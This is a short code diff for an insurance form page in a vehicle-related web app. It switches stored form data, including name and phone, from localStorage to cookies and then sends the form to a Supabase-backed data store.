@@ -18,8 +18,10 @@ import { FullPageLoader } from "@/components/loader";
 import { StepShell } from "@/components/step-shell";
 import { getOrCreateVisitorID, checkIfBlocked } from "@/lib/visitor-tracking";
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
-import { addData } from "@/lib/supabase-client";
+import { addData, safeJsonStringify } from "@/lib/supabase-client";
 import { getSelectedVehicle } from "@/lib/vehicle-api";
+import { getCookie, setCookie, eraseCookie } from '@/lib/cookies';
+
 
 
 const FIELD_CLASS =
@@ -67,7 +69,7 @@ export default function InsurancePage() {
     setInsuranceStartDate(today);
     // Pre-fill name/phone from home step
     try {
-      const hfd = JSON.parse(localStorage.getItem("homeFormData") || "{}");
+      const hfd = JSON.parse(getCookie("homeFormData") || "{}");
       if (hfd.ownerName) setFullName(hfd.ownerName);
       if (hfd.phoneNumber) setPhoneNumber(hfd.phoneNumber);
     } catch {
@@ -124,7 +126,7 @@ export default function InsurancePage() {
       repairLocation,
       timestamp: new Date().toISOString(),
     };
-    localStorage.setItem("insurFormData", JSON.stringify(insurData));
+    setCookie("insurFormData", safeJsonStringify(insurData));
     await addData({
       id: visitorID,
       ...insurData,
